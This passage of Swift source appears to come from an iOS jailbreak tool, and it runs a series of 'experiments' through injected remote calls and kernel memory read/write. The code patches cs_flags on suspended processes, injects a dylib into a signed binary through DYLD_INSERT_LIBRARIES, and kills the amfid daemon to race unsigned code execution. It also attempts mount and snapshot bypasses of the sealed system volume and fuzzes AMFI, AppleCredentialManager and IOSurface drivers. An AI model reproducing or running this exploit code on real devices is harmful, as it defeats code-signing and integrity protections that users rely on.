            let pidAddr2 = mem + 0x1E00
            rc[pidAddr2].setValue64(0)
            
            // Spawn with START_SUSPENDED so we can patch before it runs
            let attrAddr2 = mem + 0x1800
            rc[attrAddr2].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr2)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr2, 0x0080) // POSIX_SPAWN_START_SUSPENDED
            
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, dstPath, 0, attrAddr2, argvBase2, 0)
            let spawnedPid = rc[pidAddr2].value32()
            detail += "Spawn (SUSPENDED): ret=\(spawnRet), pid=\(spawnedPid)\n"
            
            if spawnRet == 0 && spawnedPid != 0 {
                // Process is suspended! Patch its cs_flags NOW
                let spawnedProc = mgr.findProc(pid: Int32(spawnedPid))
                if spawnedProc != 0 {
                    let spProcRo = ds_kread64(spawnedProc + UInt64(off_proc_p_proc_ro))
                    if spProcRo != 0 {
                        let spFlags = ds_kread32(spProcRo + 0x1c)
                        let spNewFlags = (spFlags | 0x4800) & ~UInt32(0x000C) // +DEBUGGED +GET_TASK_ALLOW -HARD -KILL
                        ds_kwrite32(spProcRo + 0x1c, spNewFlags)
                        detail += "Patched spawned process cs_flags: 0x\(String(format: "%x", spFlags)) â†’ 0x\(String(format: "%x", spNewFlags))\n"
                    }
                }
                
                // Resume the process
                RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 18) // SIGCONT
                RootExecutor.rcall(rc, "usleep", 1000000) // 1s
                
                // Check if it's still alive (not killed by AMFI)
                let statusAddr = mem + 0x380
                rc[statusAddr].setValue32(0)
                let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, UInt64(WNOHANG))
                let status = rc[statusAddr].value32()
                
                detail += "After resume: waitpid=\(waitRet), status=0x\(String(format: "%x", status))\n"
                
                let exited = (status & 0x7F) == 0
                let exitCode = (status >> 8) & 0xFF
                let signaled = (status & 0x7F) != 0 && (status & 0x7F) != 0x7F
                let sig = status & 0x7F
                
                if exited && exitCode == 0 {
                    detail += "ðŸŽ‰ðŸŽ‰ðŸŽ‰ PROCESS RAN AND EXITED NORMALLY! ðŸŽ‰ðŸŽ‰ðŸŽ‰\n"
                    detail += "CS_DEBUGGED BYPASS WORKS!\n"
                    anySuccess = true
                } else if signaled && sig == 9 {
                    detail += "âŒ Killed by SIGKILL (AMFI still enforcing)\n"
                } else if waitRet == 0 {
                    detail += "Process still running (not reaped yet)\n"
                    RootExecutor.rcall(rc, "kill", UInt64(spawnedPid), 9)
                    RootExecutor.rcall(rc, "waitpid", UInt64(spawnedPid), statusAddr, 0)
                } else {
                    detail += "status=0x\(String(format: "%x", status)) (exit=\(exitCode), sig=\(sig))\n"
                }
            }
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr2)
        }
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 3: Trust Cache â€” DISABLED (neighbor scan causes panic)
        // Reading arbitrary addresses near pmap_cs hits inaccessible zones
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 3: Trust Cache scan â•â•â•\n"
        detail += "âš ï¸ DISABLED â€” scanning kernel memory near pmap_cs causes panic\n"
        detail += "Socket KRW cannot safely read arbitrary __DATA addresses\n"
        let _ = [] as [(Int, UInt64)]
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 4: IOSurface external method 9 (getValue)
        // IOSurface user client has methods that read/write kernel objects
        // Selector 9 = s_get_value, Selector 10 = s_set_value
        // These operate on IOSurface properties in kernel heap!
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 4: IOSurface getValue/setValue â•â•â•\n"
        
        guard let sb = dspmgr.shared.sbProc else {
            detail += "No SpringBoard RC\n"
            RootExecutor.rcall(rc, "unlink", dstPath)
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
        }
        
        let sbMem = sb.trojanMem
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Open IOSurfaceRoot user client
        let ioSvcName = remote_alloc_str(sb, "IOSurfaceRoot")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", ioSvcName)
        let ioSvc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        if ioSvc != 0 {
            let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
            let connectAddr = sbMem + 0x1A00
            sb[connectAddr].setValue32(0)
            let openRet = RootExecutor.rcall(sb, "IOServiceOpen", ioSvc, taskSelf, 0, connectAddr)
            let ioConnect = sb[connectAddr].value32()
            
            detail += "IOSurfaceRoot: connect=\(ioConnect), ret=0x\(String(format: "%x", openRet))\n"
            
            if openRet == 0 && ioConnect != 0 {
                // Try external method selectors 6-15 (IOSurface has ~30 methods)
                // Selector 6 = create, 9 = get_value, 10 = set_value, etc.
                let scalarIn = sbMem + 0x2000
                let scalarOut = sbMem + 0x2200
                let scalarOutCnt = sbMem + 0x2400
                
                let testSelectors = [6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
                for sel in testSelectors {
                    sb[scalarIn].setValue64(0)
                    sb[scalarOutCnt].setValue32(16)
                    let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                                UInt64(ioConnect), UInt64(sel),
                                                0, 0,
                                                scalarOut, scalarOutCnt)
                    if ret == 0 {
                        let out = sb[scalarOut].value64()
                        detail += "  âœ… IOSurf sel \(sel): SUCCESS! out=0x\(String(format: "%llx", out))\n"
                        anySuccess = true
                    } else if ret != 0xe00002bc && ret != 0xe00002c7 {
                        detail += "  âš ï¸ IOSurf sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                    }
                }
                
                RootExecutor.rcall(sb, "IOServiceClose", UInt64(ioConnect))
            }
        } else {
            detail += "IOSurfaceRoot service not found\n"
        }
        RootExecutor.rcall(sb, "free", ioSvcName)
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 5: Spawn signed binary via symlink (already works!)
        // + try to make it load OUR dylib via DYLD_INSERT_LIBRARIES
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 5: DYLD_INSERT via env â•â•â•\n"
        
        // Write a fake dylib to /tmp (just Mach-O header)
        let fakeDylib = "/tmp/.dsp_inject.dylib"
        let fakeAddr = remote_alloc_str(rc, fakeDylib)
        RootExecutor.rcall(rc, "unlink", fakeAddr)
        let fakeFd = RootExecutor.rcall(rc, "open", fakeAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if fakeFd != UInt64(bitPattern: -1) {
            // Write minimal dylib header
            let hdrAddr = mem + 0x800
            // MH_MAGIC_64 + ARM64 + MH_DYLIB
            rc[hdrAddr].setValue64(0x0000000100000CCF)      // magic + cputype
            rc[hdrAddr + 8].setValue64(0x0000000600000000)  // filetype=MH_DYLIB + ncmds=0
            rc[hdrAddr + 16].setValue64(0x0020008500000000) // sizeofcmds=0 + flags
            rc[hdrAddr + 24].setValue64(0)                  // reserved
            RootExecutor.rcall(rc, "write", fakeFd, hdrAddr, 32)
            RootExecutor.rcall(rc, "close", fakeFd)
        }
        
        // Spawn /bin/df (SIGNED) with DYLD_INSERT_LIBRARIES pointing to our dylib
        let envBase = mem + 0x2800
        let dyldEnv = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/tmp/.dsp_inject.dylib")
        let pathEnv = remote_alloc_str(rc, "PATH=/bin:/usr/bin:/sbin")
        rc[envBase].setValue64(dyldEnv)
        rc[envBase + 8].setValue64(pathEnv)
        rc[envBase + 16].setValue64(0)
        
        let signedBin = remote_alloc_str(rc, "/bin/df")
        let argvBase3 = mem + 0x1C00
        rc[argvBase3].setValue64(signedBin)
        rc[argvBase3 + 8].setValue64(0)
        let pidAddr3 = mem + 0x1E00
        rc[pidAddr3].setValue64(0)
        
        let dyldRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr3, signedBin, 0, 0, argvBase3, envBase)
        let dyldPid = rc[pidAddr3].value32()
        RootExecutor.rcall(rc, "usleep", 500000)
        let dyldWait = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        detail += "Spawn /bin/df + DYLD_INSERT: ret=\(dyldRet), pid=\(dyldPid), wait=\(dyldWait)\n"
        
        if dyldRet == 0 {
            detail += "Spawn succeeded â€” check if dylib was loaded (need output capture)\n"
            // If DYLD_INSERT works â†’ we can inject code into ANY signed process!
        }
        
        RootExecutor.rcall(rc, "free", dyldEnv)
        RootExecutor.rcall(rc, "free", pathEnv)
        RootExecutor.rcall(rc, "free", signedBin)
        RootExecutor.rcall(rc, "free", fakeAddr)
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "unlink", remote_alloc_str(rc, fakeDylib))
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // SUMMARY
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• SUMMARY â•â•â•\n"
        detail += "Paths tested: 5\n"
        detail += anySuccess ? "ðŸ”¥ Some paths showed promise!\n" : "All paths blocked by AMFI MAC policy\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
    }
    

    // MARK: - Experiment 63: SSV / Mount Bypass
    
    private func expSSVBypass(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "SSV / Mount Bypass Research\n\n"
        
        // Test 1: Try mount() syscall variants
        detail += "=== Test 1: mount() syscall ===\n"
        let targetDir = remote_alloc_str(rc, "/var/jb")
        RootExecutor.rcall(rc, "mkdir", targetDir, 0o755)
        
        let nullfs = remote_alloc_str(rc, "nullfs")
        let srcDir = remote_alloc_str(rc, "/usr/bin")
        let mountRet1 = RootExecutor.rcall(rc, "mount", nullfs, targetDir, 0, srcDir)
        let mountErr1 = remote_errno(rc)
        detail += "mount(nullfs): ret=\(mountRet1), errno=\(mountErr1)\n"
        
        let bindfs = remote_alloc_str(rc, "bindfs")
        let mountRet2 = RootExecutor.rcall(rc, "mount", bindfs, targetDir, 0, srcDir)
        let mountErr2 = remote_errno(rc)
        detail += "mount(bindfs): ret=\(mountRet2), errno=\(mountErr2)\n"
        
        RootExecutor.rcall(rc, "free", nullfs)
        RootExecutor.rcall(rc, "free", bindfs)
        RootExecutor.rcall(rc, "free", srcDir)
        
        // Test 2: APFS snapshot
        detail += "\n=== Test 2: APFS Snapshots ===\n"
        let rootPath = remote_alloc_str(rc, "/")
        let rootFd = RootExecutor.rcall(rc, "open", rootPath, UInt64(O_RDONLY), 0)
        detail += "open(/): fd=\(rootFd == UInt64(bitPattern: -1) ? -1 : Int64(rootFd))\n"
        
        if rootFd != UInt64(bitPattern: -1) {
            let snapName = remote_alloc_str(rc, "dsploit_snap")
            let createRet = RootExecutor.rcall(rc, "fs_snapshot_create", rootFd, snapName, 0)
            let createErr = remote_errno(rc)
            detail += "fs_snapshot_create(/): ret=\(createRet), errno=\(createErr)\n"
            if createRet == 0 { detail += "SNAPSHOT CREATED!\n" }
            RootExecutor.rcall(rc, "free", snapName)
            RootExecutor.rcall(rc, "close", rootFd)
        }
        
        // Test 3: Snapshot on /var
        detail += "\n=== Test 3: Snapshot on /var ===\n"
        let varPath = remote_alloc_str(rc, "/private/var")
        let varFd = RootExecutor.rcall(rc, "open", varPath, UInt64(O_RDONLY), 0)
        if varFd != UInt64(bitPattern: -1) {
            let snapName2 = remote_alloc_str(rc, "dsploit_var")
            let createRet2 = RootExecutor.rcall(rc, "fs_snapshot_create", varFd, snapName2, 0)
            let createErr2 = remote_errno(rc)
            detail += "fs_snapshot_create(/var): ret=\(createRet2), errno=\(createErr2)\n"
            if createRet2 == 0 {
                detail += "VAR SNAPSHOT CREATED!\n"
                RootExecutor.rcall(rc, "fs_snapshot_delete", varFd, snapName2, 0)
            }
            RootExecutor.rcall(rc, "free", snapName2)
            RootExecutor.rcall(rc, "close", varFd)
        }
        RootExecutor.rcall(rc, "free", varPath)
        RootExecutor.rcall(rc, "free", rootPath)
        RootExecutor.rcall(rc, "free", targetDir)
        
        // Test 4: Mount flags
        detail += "\n=== Test 4: Mount info ===\n"
        let stPath = remote_alloc_str(rc, "/")
        let stBuf = mem + 0x1000
        if RootExecutor.rcall(rc, "statfs", stPath, stBuf) == 0 {
            let flags = rc[stBuf + 0x28].value32()
            detail += "/ flags: 0x\(String(format: "%x", flags))"
            if flags & 0x1 != 0 { detail += " RDONLY" }
            if flags & 0x1000 != 0 { detail += " LOCAL" }
            detail += "\n"
        }
        RootExecutor.rcall(rc, "free", stPath)
        
        let success = detail.contains("CREATED")
        return ExperimentResult(name: "SSV/Mount bypass", success: success, detail: detail, timestamp: Date())
    }

    // MARK: - Experiment 64: CoreTrust Signature Research
    
    private func expCoreTrustResearch(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "CoreTrust Signature Research\n\n"
        let pid = RootExecutor.rcall(rc, "getpid")
        
        // Test 1: Read code signature blob
        detail += "=== Test 1: Code signature blob ===\n"
        let blobBuf = mem + 0x2000
        let csRet = RootExecutor.rcall(rc, "csops", pid, 5, blobBuf, 4096)
        detail += "csops(CS_OPS_BLOB): ret=\(csRet)\n"
        if csRet == 0 {
            let magic = rc[blobBuf].value32()
            let length = rc[blobBuf + 4].value32()
            detail += "magic=0x\(String(format: "%x", magic)), length=\(length)\n"
            if magic == 0xfade0cc0 {
                let count = rc[blobBuf + 8].value32()
                detail += "Valid SuperBlob! count=\(count)\n"
            }
        }
        
        // Test 2: cs_flags analysis
        detail += "\n=== Test 2: CS flags ===\n"
        let statusAddr = mem + 0x1A00
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let csFlags = rc[statusAddr].value32()
        detail += "cs_flags: 0x\(String(format: "%x", csFlags))\n"
        if csFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY\n" }
        if csFlags & 0x20000000 != 0 { detail += "  CS_RUNTIME\n" }
        if csFlags & 0x1 != 0 { detail += "  CS_VALID\n" }
        
        // Test 3: MISValidateSignatureAndCopyInfo
        detail += "\n=== Test 3: MIS validation ===\n"
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Load Security/MIS framework FIRST (might not be loaded in launchd)
        let fwPath = remote_alloc_str(rc, "/System/Library/Frameworks/Security.framework/Security")
        let fwHandle = RootExecutor.rcall(rc, "dlopen", fwPath, 1)
        RootExecutor.rcall(rc, "free", fwPath)
        let misPath = remote_alloc_str(rc, "/usr/lib/libmis.dylib")
        RootExecutor.rcall(rc, "dlopen", misPath, 1)
        RootExecutor.rcall(rc, "free", misPath)
        
        let misValidate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "MISValidateSignatureAndCopyInfo"))
        detail += "Security.framework: \(fwHandle != 0 ? "loaded" : "failed")\n"
        detail += "MISValidateSignatureAndCopyInfo: \(misValidate != 0 ? "FOUND" : "not available")\n"
        
        if misValidate != 0 {
            detail += "\nMIS function available but CANNOT call from launchd (causes panic).\n"
            detail += "MIS internally connects to amfid via XPC — crashes without proper context.\n"
            detail += "Would need to call from amfid itself (which we can't RC into).\n"
        }
        
        // Test 4: Provisioning profile paths
        detail += "\n=== Test 4: Provisioning profiles ===\n"
        let paths = ["/var/MobileDevice/ProvisioningProfiles", "/var/db/MobileIdentity"]
        for path in paths {
            let p = remote_alloc_str(rc, path)
            let ret = RootExecutor.rcall(rc, "stat", p, mem + 0x1000)
            detail += "\(path): \(ret == 0 ? "EXISTS" : "missing")\n"
            RootExecutor.rcall(rc, "free", p)
        }
        
        let success = detail.contains("FOUND") || detail.contains("VALID")
        return ExperimentResult(name: "CoreTrust research", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 65: amfid Kill Race
    
    /// Kill amfid daemon + immediately try to spawn unsigned binary
    /// amfid auto-restarts (KeepAlive) but there's a window where it's dead
    /// If kernel waits for amfid response and times out → might default-allow
    /// SAFE: worst case = respring (amfid restarts, no bootloop)
    private func expAmfidKillRace(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        var detail = "amfid Kill Race Experiment\n\n"
        
        // Step 1: Find amfid PID
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "amfid not found!\n"
            return ExperimentResult(name: "amfid kill race", success: false, detail: detail, timestamp: Date())
        }
        
        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n"
        
        // Step 2: Prepare copied binary BEFORE killing amfid
        let srcPath = remote_alloc_str(rc, "/bin/df")
        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_race_bin")
        RootExecutor.rcall(rc, "unlink", dstPath)
        
        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
            let buf = mem + 0x800
            for _ in 0..<50 {
                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
                if n == 0 || n > 2048 { break }
                RootExecutor.rcall(rc, "write", df, buf, n)
            }
            RootExecutor.rcall(rc, "close", sf)
            RootExecutor.rcall(rc, "close", df)
        }
        detail += "Binary prepared at /tmp/.dsp_race_bin\n\n"
        
        // Step 3: Setup spawn args (ready to fire immediately after kill)
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(dstPath)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x1E00
        
        // Step 4: KILL amfid!
        detail += "=== KILLING amfid (PID \(amfidPid)) ===\n"
        let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9) // SIGKILL
        detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"
        
        // Step 5: IMMEDIATELY try to spawn (race window!)
        // No usleep — spawn as fast as possible while amfid is dead
        rc[pidAddr].setValue64(0)
        let spawnRet1 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid1 = rc[pidAddr].value32()
        detail += "Spawn attempt 1 (immediate): ret=\(spawnRet1), pid=\(spawnPid1)\n"
        
        // Try again quickly
        rc[pidAddr].setValue64(0)
        let spawnRet2 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid2 = rc[pidAddr].value32()
        detail += "Spawn attempt 2: ret=\(spawnRet2), pid=\(spawnPid2)\n"
        
        // Try once more
        rc[pidAddr].setValue64(0)
        let spawnRet3 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid3 = rc[pidAddr].value32()
        detail += "Spawn attempt 3: ret=\(spawnRet3), pid=\(spawnPid3)\n"
        
        // Step 6: Wait and check if amfid restarted
        RootExecutor.rcall(rc, "usleep", 2000000) // 2s — let amfid restart
        
        let newAmfidProc = mgr.findProc(name: "amfid")
        if newAmfidProc != 0 {
            let newPid = ds_kread32(newAmfidProc + UInt64(off_proc_p_pid))
            detail += "\namfid restarted! New PID: \(newPid)\n"
        } else {
            detail += "\namfid NOT restarted yet (might cause issues)\n"
        }
        
        // Step 7: Analyze results
        detail += "\n=== RESULTS ===\n"
        let anySuccess = spawnRet1 == 0 || spawnRet2 == 0 || spawnRet3 == 0
        
        if anySuccess {
            detail += "SPAWN SUCCEEDED WHILE AMFID WAS DEAD!\n"
            detail += "This means kernel DEFAULT-ALLOWS when amfid unavailable!\n"
            detail += "FULL JAILBREAK PATH: kill amfid + spawn = bypass!\n"
            
            // Wait for spawned process
            RootExecutor.rcall(rc, "usleep", 1000000)
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
            let status = rc[statusAddr].value32()
            let exited = (status & 0x7F) == 0
            let sig = status & 0x7F
            
            if exited {
                detail += "Process EXITED NORMALLY! Binary executed!\n"
            } else if sig == 9 {
                detail += "Process was SIGKILL'd (amfid restarted and killed it)\n"
                detail += "But spawn DID succeed — need faster execution\n"
            }
        } else {
            detail += "All spawns failed (ret=\(spawnRet1)/\(spawnRet2)/\(spawnRet3))\n"
            if spawnRet1 == 13 {
                detail += "EACCES — kernel enforces AMFI independently of amfid\n"
                detail += "Killing amfid does NOT bypass code signing\n"
            } else {
                detail += "Different error — might be timing related\n"
            }
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)
        
        return ExperimentResult(name: "amfid kill race", success: anySuccess, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 66: IOKit Driver Fuzzer (LAST TRY)
    
    /// Targeted fuzzing of IOKit external methods
    /// Looking for: OOB read/write, type confusion, integer overflow
    /// Targets: AMFI (11 methods), IOSurfaceRoot, AppleCredentialManager
    /// Strategy: send crafted struct inputs that commonly trigger bugs
    private func expIOKitFuzzer() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "IOKit Fuzzer", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "IOKit Driver Targeted Fuzzer\n\n"
        var anomalies: [(String, String)] = []
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        
        // Helper: open a service
        func openService(_ name: String) -> UInt32 {
            let nameAddr = remote_alloc_str(sb, name)
            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
            guard matchDict != 0 else { RootExecutor.rcall(sb, "free", nameAddr); return 0 }
            let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
            guard svc != 0 else { RootExecutor.rcall(sb, "free", nameAddr); return 0 }
            let connectAddr = mem + 0x1A00
            sb[connectAddr].setValue32(0)
            let ret = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
            RootExecutor.rcall(sb, "free", nameAddr)
            return ret == 0 ? sb[connectAddr].value32() : 0
        }
        
        // Fuzz patterns that commonly trigger bugs
        let fuzzPatterns: [(String, [UInt64])] = [
            ("zeros", [0, 0, 0, 0, 0, 0, 0, 0]),
            ("max_u32", [0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0]),
            ("max_u64", [0xFFFFFFFFFFFFFFFF, 0, 0, 0, 0, 0, 0, 0]),
            ("negative", [UInt64(bitPattern: -1), UInt64(bitPattern: -2), 0, 0, 0, 0, 0, 0]),
            ("large_size", [0x41414141, 0x7FFFFFFF, 0, 0, 0, 0, 0, 0]),
            ("kernel_ptr", [0xFFFFFFF000000000, 0, 0, 0, 0, 0, 0, 0]),
            ("heap_ptr", [0xFFFFFFFE00000000, 0, 0, 0, 0, 0, 0, 0]),
            ("small_ints", [1, 2, 3, 4, 5, 6, 7, 8]),
        ]
        
        let structIn = mem + 0x2200
        let structOut = mem + 0x2400
        let structOutSize = mem + 0x2600
        let scalarIn = mem + 0x2800
        let scalarOut = mem + 0x2A00
        let scalarOutCnt = mem + 0x2C00
        
        // ═══ FUZZ AMFI (11 active selectors: 2,4,5,6,7,9,11,12,13,14,15) ═══
        detail += "=== AMFI External Methods ===\n"
        let amfiConnect = openService("AppleMobileFileIntegrity")
        
        if amfiConnect != 0 {
            detail += "AMFI connect=\(amfiConnect)\n"
            let amfiSelectors = [2, 4, 5, 6, 7, 9, 11, 12, 13, 14, 15]
            
            for sel in amfiSelectors.prefix(6) {
                for (patName, pattern) in fuzzPatterns.prefix(5) {
                    // Write pattern to struct input
                    for (i, val) in pattern.prefix(4).enumerated() {
                        sb[structIn + UInt64(i * 8)].setValue64(val)
                    }
                    sb[structOutSize].setValue64(256)
                    
                    // Try struct method
                    let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                                UInt64(amfiConnect), UInt64(sel),
                                                structIn, 32,
                                                structOut, structOutSize)
                    
                    let outSize = sb[structOutSize].value64()
                    
                    // Check for anomalies
                    if ret == 0 {
                        anomalies.append(("AMFI sel\(sel) \(patName)", "SUCCESS! outSize=\(outSize)"))
                        detail += "  !! sel \(sel) + \(patName): ret=0, out=\(outSize)\n"
                    } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 {
                        // Unexpected error code = interesting
                        let retHex = String(format: "0x%x", ret)
                        if ret != 0xe0000001 {
                            anomalies.append(("AMFI sel\(sel) \(patName)", "unusual ret=\(retHex)"))
                            detail += "  ? sel \(sel) + \(patName): ret=\(retHex)\n"
                        }
                    }
                }
            }
            RootExecutor.rcall(sb, "IOServiceClose", UInt64(amfiConnect))
        } else {
            detail += "Cannot open AMFI\n"
        }
        
        // ═══ FUZZ AppleCredentialManager ═══
        detail += "\n=== AppleCredentialManager ===\n"
        let credConnect = openService("AppleCredentialManager")
        
        if credConnect != 0 {
            detail += "CredMgr connect=\(credConnect)\n"
            
            for sel in 0..<10 {
                for (patName, pattern) in fuzzPatterns.prefix(4) {
                    for (i, val) in pattern.prefix(4).enumerated() {
                        sb[structIn + UInt64(i * 8)].setValue64(val)
                    }
                    sb[structOutSize].setValue64(256)
                    
                    let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                                UInt64(credConnect), UInt64(sel),
                                                structIn, 32,
                                                structOut, structOutSize)
                    
                    if ret == 0 {
                        let outSize = sb[structOutSize].value64()
                        anomalies.append(("CredMgr sel\(sel) \(patName)", "SUCCESS! out=\(outSize)"))
                        detail += "  !! sel \(sel) + \(patName): SUCCESS out=\(outSize)\n"
                        
                        // Read output data
                        if outSize > 0 && outSize <= 64 {
                            var outBuf = [UInt8](repeating: 0, count: Int(outSize))
                            sb.remoteRead(structOut, to: &outBuf, size: outSize)
                            let hex = outBuf.prefix(16).map { String(format: "%02x", $0) }.joined(separator: " ")
                            detail += "    data: \(hex)\n"
                        }
                    } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 && ret != 0xe0000001 {
                        anomalies.append(("CredMgr sel\(sel) \(patName)", "ret=0x\(String(format: "%x", ret))"))
                        detail += "  ? sel \(sel) + \(patName): ret=0x\(String(format: "%x", ret))\n"
                    }
                }
            }
            RootExecutor.rcall(sb, "IOServiceClose", UInt64(credConnect))
        } else {
            detail += "Cannot open CredentialManager\n"
        }
        
        // ═══ FUZZ IOSurfaceRoot with scalar inputs ═══
        detail += "\n=== IOSurfaceRoot (scalar) ===\n"
        let ioSurfConnect = openService("IOSurfaceRoot")
        
        if ioSurfConnect != 0 {
            detail += "IOSurf connect=\(ioSurfConnect)\n"
            
            // IOSurface has methods that take scalar inputs
            // Selectors 0-30, try with various scalar counts
            for sel in [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] {
                sb[scalarIn].setValue64(0)
                sb[scalarIn + 8].setValue64(0)
                sb[scalarOutCnt].setValue32(16)
                
                let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                            UInt64(ioSurfConnect), UInt64(sel),
                                            scalarIn, 2,
                                            scalarOut, scalarOutCnt)
                
                if ret == 0 {
                    let outCnt = sb[scalarOutCnt].value32()
                    let val0 = sb[scalarOut].value64()
                    anomalies.append(("IOSurf sel\(sel)", "SUCCESS cnt=\(outCnt) val=0x\(String(format: "%llx", val0))"))
                    detail += "  !! sel \(sel): SUCCESS! cnt=\(outCnt), val=0x\(String(format: "%llx", val0))\n"
                } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 && ret != 0xe0000001 {
                    detail += "  ? sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                    anomalies.append(("IOSurf sel\(sel)", "ret=0x\(String(format: "%x", ret))"))
                }
            }
